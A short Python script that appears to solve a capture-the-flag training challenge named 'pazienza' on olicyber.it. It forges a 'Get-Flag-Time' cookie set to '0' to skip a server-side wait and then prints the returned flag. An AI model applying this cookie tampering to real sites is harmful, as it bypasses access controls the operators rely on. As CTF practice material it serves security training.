import requests

url = 'https://pazienza.challs.olicyber.it'
payload ={'Get-Flag-Time':'0'}
r = requests.post(url, cookies=payload).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)